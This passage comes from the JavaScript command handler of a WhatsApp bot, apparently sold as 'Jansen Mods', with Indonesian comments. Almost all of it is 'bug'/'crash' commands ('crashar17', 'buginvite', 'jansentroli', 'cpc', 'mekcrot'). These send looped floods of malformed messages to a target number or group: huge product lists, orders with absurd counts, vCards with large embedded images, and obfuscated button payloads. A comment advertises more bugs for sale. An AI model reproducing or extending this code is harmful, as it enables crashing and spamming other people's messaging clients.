26'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x192)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x18e)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x190)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':_0x39080c(0x195)},{'productId':_0x39080c(0x1a5)},{'productId':'1847261837216262'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x39080c(0x18f)},'businessOwnerJid':'6281364399250@s.whatsapp.net'},'footerText':''+buttonkal}}),{'userJid':m[_0x39080c(0x1a2)],'quoted':m});function _0x4b8f(_0x635405,_0x57e435){var _0x3b16d7=_0x3b16();return _0x4b8f=function(_0x4b8f78,_0x305957){_0x4b8f78=_0x4b8f78-0x18d;var _0x3baff1=_0x3b16d7[_0x4b8f78];return _0x3baff1;},_0x4b8f(_0x635405,_0x57e435);}jansen['relayMessage'](m[_0x39080c(0x1a2)],bugshinchan[_0x39080c(0x198)],{'messageId':bugshinchan[_0x39080c(0x19f)]['id']});
}
}
break
//=================================================//
case 'jansenbug7': case 'jansencrash6': case 'crashar16':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/c/6281364399250",
"matchedText": "https://wa.me/c/6281364399250",
"description": "Developer JANSEN\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
}
break
//=================================================//
case 'jansenbug8': case 'jansencrash7': case 'crashar17': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯\nitem1.TEL;waid=6281364399250:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMACAYGBwYFCAcHBwkJCAoMFA0MCwsMGRITDxQdGh8eHRocHCAkLicgIiwjHBwoNyksMDE0NDQfJzk9ODI8LjM0Mv/bAEMBCQkJDAsMGA0NGDIhHCEyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMv/AABEIAGAAYAMBIgACEQEDEQH/xAAcAAACAwEAAwAAAAAAAAAAAAAFBgMEBwIAAQj/xAAzEAACAQMDAwIDBwQDAQAAAAABAgMABBEFEiEGMUETUSJhgQcyUnGRocEUQrHwFXLRI//EABkBAAIDAQAAAAAAAAAAAAAAAAECAAMEBf/EACARAAICAgMBAQEBAAAAAAAAAAABAhEDIRIxQQRhIkL/2gAMAwEAAhEDEQA/AM9O1rrbGD6UR2rnzz3q6dQS0UYO5lwf0PmqD/8AxB+Hmg17ekMVVst7+1Y+DySOhzWONhO61h1ZfjJYFgu3uwbxUcVvfXKgliqBdo8nb7GqmlWxllWWQbjnPPk0+aVboFUsBxzVvGMdIr5ynt9C/b9MXM0W6QysSuOTj8qtv0dOyepGhUAB87ueDz+1O0dzEi4yB/7VpLxGRVBGACPp3qWShSt/s6up2b022gJkfEfPio7/AKB1awVngdmK+Ac8Af4rRrDUQqLk4JAz+lETepKOcGi6oitMw+HXtU0iYC5ZwA2SG5BP8U/6B1PDfKvZX/uXPb/c1Y6m6Ug1exkliRVl2nx3rHrS8udE1NkOQYnKlTVUsEZq49lkc8oOpbR9H2zhosg5BORU9LHRmrjUtOyTyo7E5xTMTW35pXiSfmjnfVGsrr3Z89dQuIr66VAFCysAPYbjSqd0svuzGm/ruxk03qC9gcEBpCyH8Sscg/v+1LumW7XF/GgHAO4/ICqoRpF2SVtIY9OgEcagDsAKPQTGNQBQZrlLVgm0s2OceK8XVdzbVib6mkpvZZGSQeM5ZQc8ipobk7lGeGIFBYLh3+J0IHtV9ASvHfuD86UsTsZoJPgGD+tFbVl2h3kVR5yaS5bmZol9NyoA5qpEbm4uVQSsxz+dMC2atbTQSExiRWzwOeKxn7R9I/4/qZpVXEVwoYY9+x/xWk6RBGsarLJlhzw3NUvtF0dbzpZr1fjktSG3eduef80YumJNNx2DvsoWVrW7chvTXCgnsT3rRmbarE+Bmkr7OrlRoEdrtUMi71ZRjcrHz8wQR+lN8rZjYZ5PFasUaiYssuUgD1v0xZ9Q6eHkf0rmEZSYDPw98MPIzWQ9NW/pX14kikPF8JBGCCCQf8Vv0qCVWR+3HasTS0lsupb15QQJpnRs/i4b98mlyrVobFK3TJGt4YNzuAckszNQufXLKOQoFZseVXii9/ZtdQlA7Kp7geaCXWgyXCRgbYyg27h2I/KqIpPs1Pl/kI2moRzIJI23KfBGCKNW59XAUZJ7AUHsNN2mNBlgiFM+DznJ9zmm/pywVrtEfxStK9Dq/QVqEE0MaqEOWOKSNTvr/wDqjDG8scRbaqxHlsHBzjuc+K3/AFPQ4ZYGQqM44OKSZtCu4bwtG+4E+VGRRi0nskouSq6KnT/SeqMbVoL/ANItGrusy7treQCOa0DW7JoujdRt52DH+kk3NjuQpP8AFQaDavaoGlbkdhV3qGb19Du4u++Mpj/tx/NRtOWg1URJ+z1DFpUbt97G0j25/wB/WnZ2zge7ClnQIBbRPGo2qrYA8dhTBuy6/U1rj0c6W2Xn4dgP7vNIl1pK3t9qceCHcrPC3sy5A/gfWtLubVDDJIq7WVS3yNIt7qVjp15A00qs7owKp8TZ74+XejKq2LjbbuIoE4xuUqfKkYIPtUsVss5GMmutVvIr6+kuYUaNXIJVjk58n61xaXBjbFYpaejpw2rLbwpawkgAY5q707cYvix+EYyM+RVG+nElq2CMmhJv7lLmIKFWJV2k5Ib6eKAapm1llvLYCNhuI7ml8XCi5ZJVCupwQaSbPV9Vu7qGO0vHiCsA2VByPn7CmHUZvSkWVpN0h+83bJqBpIZUnh28KBQHqvV4NN0xJpg5RplXCDJ7E9vpVaLUcqMN3pf6yuf6mK2td2fiMjD28D+akXuyTj/LCehdQ6Tcq6x30SyMxISRtrEceDTMjhmyDkbeDWLPpCSxrgbiRk5FSQNquj82Oo3ELfgRtyn6HitMcq9MTwvtG09a9QPFozQWMbCOYmMz+O3IHzrJLm5jEMRLZdQGAXv25rZtU02PWelZrGMbSY90ZXjDDkf786xWysXmlMWwqVJViR93B80mVNyQMHFRf4T2LT3bM5CxxL3Hck1cTvXqVBaosEZC7clSf7h7H5/xVUTurAhePIPmq5RpF0MtP8Lc7FYicE45oLcXjB9oRx8yOKLC4juAY8lZAM7W4OPce4/KuPSQHlQfzFL0XKSbs503VLtQEs7RWkbIckY/KrUp1QSK14Aqk/dHirulxW0cocuwc+BwKNGyl1K4jtoV3yOcAAcAe5+VRbHnKPaVAaK6EMe4ngUFuJHvbhp3bhuF/Ktgk6EsJdBOmhCtw2HN2y4Yt7Y8L4xWUXNhNbXsltOm14WKOvgEHFNKDj2UxyrJqPhEAANkY/M+K9D0o3+I7mPnFdSOqDaoGaqbyWOOT+KgFmwdM6tHcaRHOXAQLuJJ7ACka8eBtWunhj9OKdzKvPPz/wDfrXOmR3GnWElgs7Pbs2VyMNj8J+teXNtI4wgyyncPzrTJuqZhSVtorvAk4IIxk/pXEdksTfGufZsUQgtpDGH2HB/arMcRwQRz86Sh0wVNp1tfLtk+8v3WU4ZT8jUTaffWq59NbmP3HDAfzTAIlByRwfNTRpxyc4pXGx4za6ANhbpcTBPSeNvwk8/pWodL2SWNiriMJM7Esx+8R4BP8UB06Met6hxkcZprsQzDI4jA4Pzp8cKdiZsrlHiEpztIYnIPNZN9o9utv1CtwpCi4gWR/wDsCVP64Fafcy5QckkVl32k75NZssn4f6YY+XxNRy9C/O3yElmaRuMgVLHHkH2Hc11HCWPHC+9ShVJ2g4UcVmbN8Y+n/9k=\nX-WA-BIZ-DESCRIPTION:Developer✯𝐉𝚫𝐍𝐒𝚵𝐍✯WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯\nEND:VCARD",
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
}
break
//=================================================//
case 'lokas': case 'jansenlokas': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
//=================================================//
case 'buglokas': case 'jansenlokas2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
}
break
//=================================================//
case 'buginvite': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME JANSEN${ngazap(prefix)}`,
"groupName": `MY NAME JANSEN${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
}
break
//=================================================//
case 'jansentroli': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./basejansen/image/pict.jpg'),
"orderTitle": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`,
"sellerJid": "6281364399250@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
//=================================================//
case 'catalog': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `©𝐂𝐀𝐓𝐀𝐋𝐎𝐆 𝐁𝐘 𝐉𝐀𝐍𝐒𝐄𝐍 𝐌𝐎𝐃𝐒${ngazap(prefix)}`,
"description": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯`,
"currencyCode": "IDR",
"footerText": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© JANSEN WE ARE NOT MASTOD`,
"url": "wa.me/6281364399250"
},
"businessOwnerJid": "6281364399250@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
//=================================================//
case 'cpc': case 'cgc':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `©𝐂𝐀𝐓𝐀𝐋𝐎𝐆 𝐁𝐘 𝐉𝐀𝐍𝐒𝐄𝐍 𝐌𝐎𝐃𝐒${ngazap(prefix)}`,
"description": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯`,
"currencyCode": "IDR",
"footerText": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© JANSEN WE ARE NOT MASTOD`,
"url": "wa.me/6281364399250"
},
"businessOwnerJid": "6281364399250@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc})
jansen.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
}
break
//=================================================//
case 'jansenjagoan' : {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
jansen.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}}}}, { quoted:doc})
}
}
break
//=================================================//
/*BUG WACAP */
case 'jansenskuy' : {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await jansen.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
}
break
//=================================================//
/*BUG WACAP */
case 'gasjansen' : {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await jansen.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
jansen.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(10000)
}
break
//=================================================//
//CUMAN WORKS DI BAILEYS TERTENTU KALAU MAU GUNAKAN 
//BUG BARU INI KALIAN BISA ORDER KE GUA YA GUYS YAH
case '🔥': case '🗿': case 'mekcrot': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
mm = text.split("|")[0]+'@s.whatsapp.net'
jumlah = text.split("|")[1]
let secon = text.split("|")[2]
a = await reply(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
for (let i = 0; i < jumlah ; i++){
function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=function(_0x128b07,_0x1424a2){_0x128b07=_0x128b07-0xc4;var _0x46e270=_0x50e42b[_0x128b07];return _0x46e270;},_0x128b(_0x4b9866,_0x371baa);}function _0x50e4(){var _0x19e1ed=['AH\x20SLEBEEW','1GwlWkW','GROUP\x20JANSEN\x20MODS','Anjay\x20Menger','27130YhLdkr','JAGOAN\x20OM?','JANSEN\x20MODS','2064696gWphjy','4LwmPfv','2167585ExfAxr','NAME','6281364399250','8702696DrukdN','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','6017EGBulL','1073458pGrfkv','6dptURc','6281364399250','10304770yoKCaH','16102656Vbpaag','OWNER'];_0x50e4=function(){return _0x19e1ed;};return _0x50e4();}var _0x1cddf0=_0x128b;(function(_0x34c939,_0x276d78){var _0x100957=_0x128b,_0x2bb075=_0x34c939();while(!![]){try{var _0x487c43=-parseInt(_0x100957(0xd7))/0x1*(-parseInt(_0x100957(0xd0))/0x2)+parseInt(_0x100957(0xc8))/0x3*(parseInt(_0x100957(0xc9))/0x4)+parseInt(_0x100957(0xca))/0x5*(parseInt(_0x100957(0xd1))/0x6)+-parseInt(_0x100957(0xd3))/0x7+parseInt(_0x100957(0xcd))/0x8+-parseInt(_0x100957(0xd4))/0x9+-parseInt(_0x100957(0xc5))/0xa*(-parseInt(_0x100957(0xcf))/0xb);if(_0x487c43===_0x276d78)break;else _0x2bb075['push'](_0x2bb075['shift']());}catch(_0x382e1c){_0x2bb075['push'](_0x2bb075['shift']());}}}(_0x50e4,0xec948),await jansen['sendMessage'](mm,{'text':'','templateButtons':[{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xd2)}},{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xcc)}},{'urlButton':{'displayText':_0x1cddf0(0xd8),'url':_0x1cddf0(0xce)}},{'quickReplyButton':{'displayText':'MY','id':_0x1cddf0(0xc4)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xcb),'id':_0x1cddf0(0xd6)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xc7),'id':_0x1cddf0(0xc6)}}]}));
  await sleep(10000* secon)
}
}
break
